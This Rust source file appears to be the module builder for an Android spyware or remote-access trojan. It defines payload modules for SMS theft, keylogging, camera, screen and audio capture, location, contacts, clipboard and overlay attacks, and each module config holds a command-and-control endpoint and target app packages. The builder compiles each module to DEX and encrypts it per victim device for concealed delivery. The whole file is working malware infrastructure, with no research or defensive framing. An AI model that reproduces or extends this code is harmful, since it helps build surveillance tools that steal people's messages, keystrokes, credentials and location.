// [context: Rust, Linux/x64, DEX module builder and encryptor]

use std::process::Command as SysCommand;
use thiserror::Error;
use serde::{Deserialize, Serialize};
use crate::crypto_mgr::payload_crypto::PayloadCrypto;

#[derive(Error, Debug)]
pub enum BuilderError {
    #[error("compile failed: {0}")]
    CompileFailed(String),
    #[error("encrypt failed")]
    EncryptFailed,
    #[error("invalid module type")]
    InvalidModuleType,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum ModuleType {
    Sms = 0x01,
    Camera = 0x02,
    Screen = 0x03,
    Keylogger = 0x04,
    Calls = 0x05,
    Contacts = 0x06,
    Location = 0x07,
    Files = 0x08,
    Clipboard = 0x09,
    Overlay = 0x0A,
    AudioRecord = 0x0B,
    AppManager = 0x0C,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ModuleConfig {
    pub module_type: ModuleType,
    pub c2_endpoint: String,
    pub batch_interval_secs: u64,
    pub target_packages: Vec<String>,
    pub extra_params: std::collections::HashMap<String, String>,
}

pub struct EncryptedModule {
    pub module_type: ModuleType,
    pub encrypted_bytes: Vec<u8>,
    pub version: String,
    pub hash: [u8; 32],
}

pub struct ModuleBuilder {
    d8_path: String,
    kotlinc_path: String,
    module_source_dir: String,
}

impl ModuleBuilder {
    pub fn new(d8_path: String, kotlinc_path: String, module_source_dir: String) -> Self {
        Self { d8_path, kotlinc_path, module_source_dir }
    }

    pub fn build_module(
        &self,
        config: ModuleConfig,
        device_key: &[u8; 32],
        device_id: &str,
    ) -> Result<EncryptedModule, BuilderError> {
        let dex_bytes = self.compile_module(&config)?;
        let module_type_byte = config.module_type.clone() as u8;

        let encrypted = PayloadCrypto::encrypt_module(
            &dex_bytes,
            device_key,
            module_type_byte,
            device_id,
        )
        .map_err(|_| BuilderError::EncryptFailed)?;

        use sha2::{Sha256, Digest};
        let hash: [u8; 32] = Sha256::digest(&encrypted).into();

        Ok(EncryptedModule {
            module_type: config.module_type,
            encrypted_bytes: encrypted,
            version: "1.0.0".to_string(),
            hash,
        })
    }

    fn compile_module(&self, config: &ModuleConfig) -> Result<Vec<u8>, BuilderError> {
        let module_name = format!("{:?}", config.module_type).to_lowercase();
        let source_path = format!("{}/{}.kt", self.module_source_dir, module_name);
        let class_output = format!("/tmp/module_build_{}", module_name);
        let dex_output = format!("{}.dex", class_output);

        // kotlinc source → classes
        let status = SysCommand::new(&self.kotlinc_path)
            .args([&source_path, "-d", &class_output])
            .status()
            .map_err(|e| BuilderError::CompileFailed(e.to_string()))?;

        if !status.success() {
            return Err(BuilderError::CompileFailed("kotlinc failed".into()));
        }

        // d8 classes → DEX
        let status = SysCommand::new(&self.d8_path)
            .args(["--output", &dex_output, &class_output])
            .status()
            .map_err(|e| BuilderError::CompileFailed(e.to_string()))?;

        if !status.success() {
            return Err(BuilderError::CompileFailed("d8 failed".into()));
        }

        std::fs::read(&dex_output)
            .map_err(|e| BuilderError::CompileFailed(e.to_string()))
    }
}
